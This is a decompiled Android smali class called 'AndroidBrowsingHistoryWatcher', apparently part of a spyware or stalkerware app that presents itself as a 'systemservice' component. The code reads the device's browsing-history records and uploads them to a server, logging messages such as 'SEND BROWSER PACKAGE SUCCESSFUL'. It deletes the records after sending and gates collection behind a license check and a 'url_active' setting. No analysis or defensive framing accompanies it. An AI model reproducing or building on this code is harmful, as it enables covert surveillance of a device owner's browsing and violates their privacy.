.class public final Lcom/systemservice/a/c/b/c;
.super Lcom/systemservice/a/d/a;
.source ""


# static fields
.field private static final d:[Ljava/lang/String;


# instance fields
.field private e:Lorg/apache/log4j/Logger;

.field private f:Z

.field private g:Ljava/lang/String;


# direct methods
.method static constructor <clinit>()V
    .locals 1

    const/4 v0, 0x0

    new-array v0, v0, [Ljava/lang/String;

    sput-object v0, Lcom/systemservice/a/c/b/c;->d:[Ljava/lang/String;

    return-void
.end method

.method public constructor <init>(Ljava/lang/String;Lcom/systemservice/common/features/settingHistory/b;Lcom/systemservice/a/h/n;)V
    .locals 1

    invoke-direct {p0}, Lcom/systemservice/a/d/a;-><init>()V

    const/4 v0, 0x0

    iput-boolean v0, p0, Lcom/systemservice/a/c/b/c;->f:Z

    const-string v0, "BrowsingHistoryWatcher"

    iput-object v0, p0, Lcom/systemservice/a/c/b/c;->g:Ljava/lang/String;

    iput-object p1, p0, Lcom/systemservice/a/d/a;->c:Ljava/lang/String;

    invoke-virtual {p0, p2}, Lcom/systemservice/a/d/g;->a(Lcom/systemservice/common/features/settingHistory/b;)V

    invoke-virtual {p0, p3}, Lcom/systemservice/a/d/g;->a(Lcom/systemservice/a/h/b;)V

    const-string p1, "AndroidBrowsingHistoryWatcher"

    invoke-static {p1}, Lcom/systemservice/a/e/m;->a(Ljava/lang/String;)Lorg/apache/log4j/Logger;

    move-result-object p1

    iput-object p1, p0, Lcom/systemservice/a/c/b/c;->e:Lorg/apache/log4j/Logger;

    return-void
.end method

.method static synthetic a(Lcom/systemservice/a/c/b/c;)Ljava/lang/String;
    .locals 0

    iget-object p0, p0, Lcom/systemservice/a/c/b/c;->g:Ljava/lang/String;

    return-object p0
.end method

.method private a(Landroid/content/Context;)V
    .locals 11

    const-string v0, ""

    const-string v1, "sending_url"

    const/4 v2, 0x0

    :try_start_0
    invoke-static {p1, v1, v2}, Lcom/systemservice/a/a/l;->a(Landroid/content/Context;Ljava/lang/String;Z)Z

    move-result v3

    if-nez v3, :cond_3

    iget-object v3, p0, Lcom/systemservice/a/d/g;->b:Lcom/systemservice/a/h/b;

    check-cast v3, Lcom/systemservice/a/h/n;

    const/4 v4, 0x0

    invoke-virtual {v3, v2, v4, v4, v2}, Lcom/systemservice/a/h/n;->a(ZLjava/util/Date;Ljava/util/Date;I)Ljava/util/List;

    move-result-object v4

    if-eqz v4, :cond_3

    invoke-interface {v4}, Ljava/util/List;->size()I

    move-result v5

    if-lez v5, :cond_3

    const/4 v5, 0x1

    invoke-static {p1, v1, v5}, Lcom/systemservice/a/a/l;->b(Landroid/content/Context;Ljava/lang/String;Z)V

    invoke-virtual {p0}, Lcom/systemservice/a/d/g;->d()Lcom/systemservice/common/features/settingHistory/b;

    move-result-object v6

    check-cast v6, Lcom/systemservice/a/c/b/d;

    invoke-virtual {v6, p1, v4}, Lcom/systemservice/a/c/b/d;->a(Landroid/content/Context;Ljava/util/List;)I

    move-result v7
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_0

    const-string v8, "ServerProtocolForUrl"

    if-ne v7, v5, :cond_0

    :try_start_1
    const-string v5, "SEND BROWSER PACKAGE SUCCESSFUL"

    invoke-static {v8, v5}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    iget-object v5, p0, Lcom/systemservice/a/c/b/c;->e:Lorg/apache/log4j/Logger;

    const-string v6, "ServerProtocolForUrl = SEND BROWSER PACKAGE SUCCESSFUL"

    invoke-virtual {v5, v6}, Lorg/apache/log4j/Category;->debug(Ljava/lang/Object;)V

    invoke-virtual {v3, v4}, Lcom/systemservice/a/h/n;->a(Ljava/util/List;)V

    goto :goto_2

    :cond_0
    invoke-interface {v4}, Ljava/util/List;->iterator()Ljava/util/Iterator;

    move-result-object v4

    :goto_0
    invoke-interface {v4}, Ljava/util/Iterator;->hasNext()Z

    move-result v7

    if-eqz v7, :cond_2

    invoke-interface {v4}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v7

    check-cast v7, Lcom/systemservice/a/d/d;

    check-cast v7, Lcom/systemservice/a/e/q;

    invoke-virtual {v6, p1, v7}, Lcom/systemservice/a/c/b/d;->a(Landroid/content/Context;Lcom/systemservice/a/e/q;)I

    move-result v9

    if-ne v9, v5, :cond_1

    iget-object v9, p0, Lcom/systemservice/a/c/b/c;->e:Lorg/apache/log4j/Logger;

    const-string v10, "ServerProtocolForUrl = SEND 1 BROWSER SUCCESSFUL"

    invoke-virtual {v9, v10}, Lorg/apache/log4j/Category;->debug(Ljava/lang/Object;)V

    const-string v9, "SEND 1 BROWSER SUCCESSFUL"

    invoke-static {v8, v9}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    invoke-virtual {v7}, Lcom/systemservice/a/e/q;->c()J

    move-result-wide v9

    :goto_1
    invoke-virtual {v3, v9, v10}, Lcom/systemservice/a/h/n;->a(J)V

    goto :goto_0

    :cond_1
    invoke-virtual {v7}, Lcom/systemservice/a/e/q;->c()J

    move-result-wide v9

    goto :goto_1

    :cond_2
    :goto_2
    invoke-static {p1, v1, v2}, Lcom/systemservice/a/a/l;->b(Landroid/content/Context;Ljava/lang/String;Z)V
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_0
    .catchall {:try_start_1 .. :try_end_1} :catchall_0

    :cond_3
    :goto_3
    invoke-static {p1, v1, v2}, Lcom/systemservice/a/a/l;->b(Landroid/content/Context;Ljava/lang/String;Z)V

    goto :goto_4

    :catchall_0
    move-exception v0

    goto :goto_5

    :catch_0
    move-exception v3

    :try_start_2
    iget-object v4, p0, Lcom/systemservice/a/c/b/c;->g:Ljava/lang/String;

    new-instance v5, Ljava/lang/StringBuilder;

    invoke-direct {v5}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v3}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v5, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v5

    invoke-static {v4, v5}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    iget-object v4, p0, Lcom/systemservice/a/c/b/c;->e:Lorg/apache/log4j/Logger;

    new-instance v5, Ljava/lang/StringBuilder;

    invoke-direct {v5}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v3}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v5, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v5, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v4, v0}, Lorg/apache/log4j/Category;->error(Ljava/lang/Object;)V
    :try_end_2
    .catchall {:try_start_2 .. :try_end_2} :catchall_0

    goto :goto_3

    :goto_4
    return-void

    :goto_5
    invoke-static {p1, v1, v2}, Lcom/systemservice/a/a/l;->b(Landroid/content/Context;Ljava/lang/String;Z)V

    throw v0
.end method

.method static synthetic a(Lcom/systemservice/a/c/b/c;Landroid/content/Context;)V
    .locals 0

    invoke-direct {p0, p1}, Lcom/systemservice/a/c/b/c;->a(Landroid/content/Context;)V

    return-void
.end method

.method static synthetic a(Lcom/systemservice/a/c/b/c;Z)Z
    .locals 0

    iput-boolean p1, p0, Lcom/systemservice/a/c/b/c;->f:Z

    return p1
.end method

.method static synthetic b(Lcom/systemservice/a/c/b/c;)Lorg/apache/log4j/Logger;
    .locals 0

    iget-object p0, p0, Lcom/systemservice/a/c/b/c;->e:Lorg/apache/log4j/Logger;

    return-object p0
.end method

.method static synthetic c(Lcom/systemservice/a/c/b/c;)Z
    .locals 0

    iget-boolean p0, p0, Lcom/systemservice/a/c/b/c;->f:Z

    return p0
.end method


# virtual methods
.method public a(Lcom/systemservice/a/b/a;)V
    .locals 3

    :try_start_0
    invoke-virtual {p1}, Lcom/systemservice/a/b/a;->a()Landroid/content/Context;

    move-result-object p1

    new-instance v0, Ljava/lang/Thread;

    new-instance v1, Lcom/systemservice/a/c/b/b;

    invoke-direct {v1, p0, p1}, Lcom/systemservice/a/c/b/b;-><init>(Lcom/systemservice/a/c/b/c;Landroid/content/Context;)V

    invoke-direct {v0, v1}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V

    invoke-virtual {v0}, Ljava/lang/Thread;->start()V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    move-exception p1

    iget-object v0, p0, Lcom/systemservice/a/c/b/c;->g:Ljava/lang/String;

    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {p1}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v2, ""

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-static {v0, v1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    iget-object v0, p0, Lcom/systemservice/a/c/b/c;->e:Lorg/apache/log4j/Logger;

    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {p1}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object p1

    invoke-virtual {v1, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p1

    invoke-virtual {v0, p1}, Lorg/apache/log4j/Category;->error(Ljava/lang/Object;)V

    :goto_0
    return-void
.end method

.method public a(Lcom/systemservice/a/d/b;)V
    .locals 3

    invoke-super {p0, p1}, Lcom/systemservice/a/d/g;->a(Lcom/systemservice/a/d/b;)V

    :try_start_0
    iget-object v0, p0, Lcom/systemservice/a/c/b/c;->e:Lorg/apache/log4j/Logger;

    const-string v1, "Start AndroidBrowsingHistory"

    invoke-virtual {v0, v1}, Lorg/apache/log4j/Category;->debug(Ljava/lang/Object;)V

    check-cast p1, Lcom/systemservice/a/b/a;

    invoke-virtual {p1}, Lcom/systemservice/a/b/a;->a()Landroid/content/Context;

    move-result-object p1

    const-string v0, "app_prefs_settings"

    const/4 v1, 0x0

    invoke-virtual {p1, v0, v1}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v0

    invoke-virtual {p0}, Lcom/systemservice/a/d/g;->d()Lcom/systemservice/common/features/settingHistory/b;

    move-result-object v2

    invoke-virtual {v2, p1}, Lcom/systemservice/common/features/settingHistory/b;->d(Landroid/content/Context;)V

    invoke-static {p1}, Lcom/systemservice/a/a/l;->b(Landroid/content/Context;)Z

    move-result v2

    if-eqz v2, :cond_0

    iget-object p1, p0, Lcom/systemservice/a/c/b/c;->e:Lorg/apache/log4j/Logger;

    const-string v0, "License Expired = true"

    invoke-virtual {p1, v0}, Lorg/apache/log4j/Category;->debug(Ljava/lang/Object;)V

    return-void

    :cond_0
    const-string v2, "url_active"

    invoke-interface {v0, v2, v1}, Landroid/content/SharedPreferences;->getBoolean(Ljava/lang/String;Z)Z

    move-result v0

    iput-boolean v0, p0, Lcom/systemservice/a/c/b/c;->f:Z

    iget-boolean v0, p0, Lcom/systemservice/a/c/b/c;->f:Z

    if-nez v0, :cond_1

    iget-object p1, p0, Lcom/systemservice/a/c/b/c;->e:Lorg/apache/log4j/Logger;

    const-string v0, "is_active == false"

    invoke-virtual {p1, v0}, Lorg/apache/log4j/Category;->debug(Ljava/lang/Object;)V

    return-void

    :cond_1
    const-string v0, "sending_url"

    invoke-static {p1, v0, v1}, Lcom/systemservice/a/a/l;->b(Landroid/content/Context;Ljava/lang/String;Z)V

    new-instance v0, Ljava/lang/Thread;

    new-instance v1, Lcom/systemservice/a/c/b/a;

    invoke-direct {v1, p0, p1}, Lcom/systemservice/a/c/b/a;-><init>(Lcom/systemservice/a/c/b/c;Landroid/content/Context;)V

    invoke-direct {v0, v1}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V

    invoke-virtual {v0}, Ljava/lang/Thread;->start()V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    move-exception p1

    iget-object v0, p0, Lcom/systemservice/a/c/b/c;->g:Ljava/lang/String;

    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {p1}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v2, ""

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-static {v0, v1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    iget-object v0, p0, Lcom/systemservice/a/c/b/c;->e:Lorg/apache/log4j/Logger;

    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {p1}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object p1

    invoke-virtual {v1, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p1

    invoke-virtual {v0, p1}, Lorg/apache/log4j/Category;->error(Ljava/lang/Object;)V

    :goto_0
    return-void
.end method

.method public e()[Ljava/lang/String;
    .locals 1

    sget-object v0, Lcom/systemservice/a/c/b/c;->d:[Ljava/lang/String;

    return-object v0
.end method
